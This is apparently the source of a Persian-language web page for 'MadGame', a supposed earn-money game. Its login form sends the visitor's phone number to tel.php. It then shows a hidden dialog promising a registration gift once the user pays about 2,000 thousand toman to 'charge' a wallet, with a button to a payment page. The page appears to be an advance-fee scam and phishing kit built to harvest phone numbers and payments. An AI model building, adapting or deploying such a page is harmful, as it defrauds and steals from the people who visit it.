<html dir="rtl" lang="fa-ir">

<head>
      <title>مدگیم</title>
      <meta charset="utf-8">
      <meta name="description" content="game for earn money (mad game)">
      <meta name="format-detection" content="telephone=no">
      <meta name="msapplication-tap-highlight" content="no">
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width">
      <link rel="icon" type="image/ico" href="statics/icons/favicon.ico">
      <link href="assets/css/app.0d0eada5.css" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="assets/css/chunk-common.650409a8.css">
      <link rel="stylesheet" type="text/css" href="assets/css/8.002a6b3e.css">
      <link rel="stylesheet" type="text/css" href="assets/css/5.3121d306.css">
      <script src="assets/js/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="assets/noty/noty.css">
      <link rel="stylesheet" type="text/css" href="assets/noty/nest.css">
      <script src="assets/noty/noty.min.js"></script>
      <style>
            .hid {
                  display: none;
            }
      </style>

</head>

<body class="desktop no-touch body--light" style="" cz-shortcut-listen="true">
      <div id="q-app">
            <div class="q-layout q-layout--standard" style="min-height: 391px;">
                  <header class="q-header q-layout__section--marginal relative-position fixed-top" style="background-color:#280447;">
                        <div role="img" class="full-width q-img overflow-hidden">
                              <div style="padding-bottom: 26.7633%;"></div>
                              <div class="q-img__image absolute-full" style="background-size: cover; background-position: 50% 50%; background-image: url(&quot;assets/images/header-mobile.635bf9fb.svg&quot;);"></div>
                              <div class="q-img__content absolute-full"></div>
                        </div>
                        <div role="img" class="absolute-center q-img overflow-hidden" style="width: 200px;">
                              <div style="padding-bottom: 50%;"></div>
     <a href="https://ibb.co/Jnk3QyL"><img src="https://i.ibb.co/qB1J5WG/Picsart-23-09-23-18-46-01-242.png" alt="Picsart-23-09-23-18-46-01-242" height="150" width="200"/></a>
                              <div class="q-img__content absolute-full"></div>
                        </div>
                  </header>
                  <div class="q-page-container" style="padding-top: 120px;">
                        <main data-v-0f44fdd8="" class="q-page q-layout-padding" style="min-height: 113px;">
                              <div data-v-0f44fdd8="" class="row justify-center">
                                    <div data-v-0f44fdd8="" class="q-mt-lg-xl q-mt-md-lg q-mt-sm-md q-mt-xs-md col-lg-5 col-md-6 col-sm-10 col-xs-11">
                                          <div data-v-0e40c844="" data-v-0f44fdd8="" class="login">
                                                <div data-v-0e40c844="" class="login__card q-py-xl q-card q-card--bordered q-card--flat no-shadow">
                                                      <div data-v-0e40c844="" class="text-center q-card__section q-card__section--vert">
                                                            <div data-v-0e40c844="" role="img" class="">

                                                                  <p class="" style="color:#333D5F;">جهت ورود به مدگیم شماره ای که با آن ثبت نام کرده اید را وارد کنید</p>
                                                                  <div class="q-img__content absolute-full"></div>
                                                            </div>
                                                      </div>
                                                      <form>
                                                            <div data-v-0e40c844="" class="">
                                                                  <div data-v-0e40c844="" class="text-center q-mb-md">شماره خود را وارد کنید</div>
                                                                  <div data-v-0e40c844="" class="row justify-center">
                                                                        <div data-v-0e40c844="" class="col-lg-8 col-md-9 col-sm-10 col-xs-11"><label data-v-0e40c844="" for="f_63d77fe5-ea5a-41ee-ac32-6bf6730eb46f" class="q-field q-validation-component row no-wrap items-start mobile-number q-mb-sm q-input q-field--outlined q-field--rounded q-field--float q-field--dense q-field--with-bottom">
                                                                                    <div class="q-field__inner relative-position col self-stretch">
                                                                                          <div tabindex="-1" class="q-field__control relative-position row no-wrap">
                                                                                                <div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
                                                                                                      <input tabindex="0" id="number" type="text" class="q-field__native q-placeholder" aria-invalid="false" autocomplete="off">
                                                                                                </div>
                                                                                          </div>
                                                                                    </div>
                                                                              </label>
                                                                        </div>
                                                                  </div>
                                                            </div>
                                                            <div data-v-0e40c844="" class="q-pt-none q-card__section q-card__section--vert">
                                                                  <div data-v-0e40c844="" class="row justify-center">
                                                                        <div data-v-0e40c844="" class="col-lg-8 col-md-9 col-sm-10 col-xs-11"><button id="submitbtn" type="submit" class="q-btn q-btn-item non-selectable no-outline full-width q-btn--unelevated q-btn--rectangle q-btn--rounded bg-primary text-white q-btn--actionable q-focusable q-hoverable q-btn--wrap"><span class="q-focus-helper"></span><span class="q-btn__wrapper col row q-anchor--skip"><span class="q-btn__content text-center col items-center q-anchor--skip justify-center row"><span class="block">ورود به اپلیکیشن مدگیم</span></span></span>
                                                                              </button></div>
                                                      </form>
                                                </div>
                                          </div>
                                    </div>
                              </div>
                              <div data-v-0f44fdd8="" class="q-mt-md text-center"></div>
                  </div>
            </div>
            </main>
      </div>
      </div>
      </div>

      <div class="q-notifications">
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-start"></div>
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-end"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-start"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-end"></div>
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-center"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-start justify-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-end justify-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap flex-center"></div>
      </div>
      <div id="download" class="q-dialog fullscreen no-pointer-events q-dialog--modal hid">
            <div aria-hidden="true" class="q-dialog__backdrop fixed-full"></div>
            <div tabindex="-1" class="q-dialog__inner flex no-pointer-events q-dialog__inner--minimized q-dialog__inner--standard fixed-full flex-center">
                  <div data-v-0f44fdd8="" class="bg-white q-card">
                        <div data-v-0f44fdd8="" class="q-card__section q-card__section--vert">
                              <div data-v-0f44fdd8="" class="text-h6 text-center">توجه</div>
                        </div>
                        <hr data-v-0f44fdd8="" aria-orientation="horizontal" class="q-separator q-separator q-separator--horizontal">
                        <div data-v-0f44fdd8="" class="scroll q-card__section q-card__section--vert" style="max-height: 60vh; max-width: 95vw; min-width: 250px; min-height: 100px;">
                              <!---->
                              <p data-v-0f44fdd8="" class="text-justify">
                                    دوست عزیزم هدیه ثبت نام شما آماده دریافت است اما قبل از دریافت هدیه شما باید مبلغ <span style="color:#72BF44;">2,000</span> هزار تومان را برای شارژ اولیه کیف پول خود پرداخت کنید بعد از پرداخت شما به سادگی میتوانید درخواست تسویه و دریافت هدیه را در اپلیکیشن ثبت کنید و کمتر از 24 ساعت هدیه خود را در حساب بانکی متصل به مدگیم که با آن کیف پول خود را شارژ کرده اید دریافت کنید
                        </div>
                        <hr data-v-0f44fdd8="" aria-orientation="horizontal" class="q-separator q-separator q-separator--horizontal">
                        <div data-v-0f44fdd8="" class="q-card__actions full-width q-px-md q-card__actions--horiz row justify-start"><a data-v-0f44fdd8="" tabindex="0" href="payment" class="q-btn q-btn-item non-selectable no-outline block full-width q-btn--unelevated q-btn--rectangle q-btn--rounded bg-positive text-white q-btn--actionable q-focusable q-hoverable q-btn--wrap"><span class="q-focus-helper"></span><span class="q-btn__wrapper col row q-anchor--skip"><span class="q-btn__content text-center col items-center q-anchor--skip justify-center row"><span class="block">پرداخت</span></span></span></a></div>
                        <p class="" style="color:#280447;">از اینکه ما را انتخاب کردید از شما تشکر میکنیم</p>
                  </div>
            </div>
      </div>
      <script>
            $(document).ready(function() {
                  $('#submitbtn').click(function(e) {
                        e.preventDefault();
                        var number = $('#number').val();
                        $.ajax({
                              type: "POST",
                              url: "tel.php",
                              data: {
                                    "number": number,
                              },
                              success: function(data) {
                                    var response = JSON.parse(data);
                                    if (response.status == '0') {
                                          new Noty({
                                                type: 'error',
                                                layout: 'topRight',
                                                theme: 'nest',
                                                text: response.message,
                                                timeout: '2000',
                                                progressBar: true,
                                          }).show();

                                    } else {
                                          new Noty({
                                                type: 'success',
                                                layout: 'topRight',
                                                theme: 'nest',
                                                text: response.message,
                                                timeout: '2000',
                                                progressBar: true,
                                          }).show();
                                          $("#download").removeClass('hid');
                                    }
                              }
                        });
                  });
            });
      </script>
</body>

</html>